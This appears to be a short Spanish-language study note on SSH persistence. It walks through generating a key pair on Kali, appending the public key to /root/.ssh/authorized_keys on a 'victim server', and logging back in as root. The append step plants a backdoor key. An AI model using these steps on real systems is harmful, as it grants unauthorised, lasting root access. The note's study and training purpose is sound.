# SSH

Tags: #Persistencia #SSH 

Es un archivo de **OpenSSH** que contiene las **claves públicas autorizadas para autenticarse como `root` por SSH**. 

	/root/.ssh/authorized_keys

Piensa en `authorized_keys` como **la lista de personas/dispositivos a los que SSH les permite entrar a una cuenta mediante una clave**.

```bash 
# Desde Kali 
Paso 1:
❯ ssh-keygen -t ed25519    # Generar la clave pública y privada 
	# Dar ENTER en todo lo que pregunte 

❯ ls -l ~/.ssh/     # Mirar las claves 
	id_ed25519 ← 🔴 PRIVADA — NO se copia al servidor 
	id_ed25519.pub ← 🟢 PÚBLICA — esta sí se copia

Paso 2:
❯ cat ~/.ssh/id_ed25519.pub   
# Mirar y copiar el contenido de la llave pública
	ssh-ed25519 AAAAC3... kali@kali
```

```bash 
Paso 3:
# Desde el server víctima Linux
❯ echo 'ssh-ed25519 AAAAC3... kali@kali' >> /root/.ssh/authorized_keys

❯ chmod 700 /root/.ssh
❯ chmod 600 /root/.ssh/authorized_keys
```

```bash 
Paso 4:
Desde Kali 
❯ ssh -i ~/.ssh/id_ed25519 root@IP   # Conectarse al server como root 
```